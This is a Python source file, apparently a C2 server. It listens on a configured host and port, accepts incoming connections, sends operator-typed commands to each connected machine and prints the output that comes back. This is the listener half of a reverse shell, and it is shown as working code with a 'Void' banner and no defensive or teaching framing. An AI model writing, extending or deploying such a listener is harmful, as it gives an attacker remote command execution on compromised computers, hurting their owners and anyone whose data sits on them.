import platform
import os
import socket
import yaml
from colorama import Fore
from time import sleep


with open("config/config.yaml") as configuration:
    c = yaml.safe_load(configuration)
    Host = c['Host']['IP-adder']
    Port = c['Host']['Port']

def Banner():
    print(Fore.LIGHTBLUE_EX+"""

____   ____    .__    .___
\   \ /   /___ |__| __| _/
 \   Y   /  _ \|  |/ __ | 
  \     (  <_> )  / /_/ | 
   \___/ \____/|__\____ | 
                       \/ 

""")

def clear():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def main():
    clear()
    Banner()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as stream:
        stream.bind((Host, Port))
        stream.listen()
        while True:
            print("\n [+] Listening For Connection .....")
            connection, address = stream.accept()
            with connection:
                print(f"\n[*] New Connection Received from {address}")
                command = input(f"[{address}] >>")
                command = command + "\n"
                commandRequest = command.encode()
                connection.sendall(commandRequest)
                commandOutput = connection.recv(1026)
                print(f"Command Output from {address}:")
                print(commandOutput.decode().strip())  


if __name__ == "__main__":
    main()
